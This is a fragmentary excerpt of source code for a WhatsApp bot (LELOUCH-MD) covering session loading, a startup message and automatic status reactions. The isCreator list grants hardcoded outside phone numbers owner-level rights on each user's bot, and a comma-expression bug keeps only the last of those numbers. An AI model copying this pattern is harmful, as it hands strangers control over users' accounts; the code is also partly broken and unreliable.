...
if (!fs.existsSync(__dirname + '/sessions/creds.json')) {
  ...
  const sessdata = config.SESSION_ID.replace("LELOUCH-MD~", '')
...
https://github.com/Mickey-bot-alt/LELOUCH-MD

> © ᴘᴏᴡᴇʀᴇᴅ ʙʏ Mickey `;
    conn.sendMessage(conn.user.id, { image: { url: `https://files.catbox.moe/kpzbvk.jpg` }, caption: up })
...
conn?.ev?.on('messages.update', async updates => {
  ...
  if (mek.key && mek.key.remoteJid === 'status@broadcast' && config.AUTO_STATUS_REACT === "true"){
    const LELOUCHlike = await conn.decodeJid(conn.user.id);
    const emojis = ['❤️', '💸', '😇', '🍂', '💥', '💯', '🔥', '💫', '💎', '💗', '🤍', '🖤', '👀', '🙌', '🙆', '🚩', '🥰', '💐', '😎', '🤎', '✅', '🫀', '🧡', '😁', '😄', '🌸', '🕊️', '🌷', '⛅', '🌟', '🗿', '🇵🇰', '💜', '💙', '🌝', '🖤', '💚'];
    ...
    }, { statusJidList: [mek.key.participant, LELOUCHlike] });
  }                       
  ...
  const udp = botNumber.split('@')[0];
    const LELOUCH = ('263780166288', '263714757857', '263780934873');
    let isCreator = [udp, LELOUCH, config.DEV]
